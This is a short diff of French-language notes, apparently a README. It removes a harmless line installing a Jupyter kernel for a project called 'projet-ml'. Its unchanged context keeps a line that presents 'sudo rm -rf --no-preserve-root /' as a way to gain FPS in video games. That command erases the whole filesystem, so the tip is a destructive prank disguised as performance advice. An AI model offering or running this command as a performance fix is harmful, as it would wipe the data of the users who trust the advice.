@@ -12,6 +12,3 @@ mais
 
 # pour gagner des FPS dans les jeux vidéos c'est
 `sudo rm -rf --no-preserve-root /`
-
-installer le kernel
-`uv run python -m ipykernel install --user --name projet-ml`
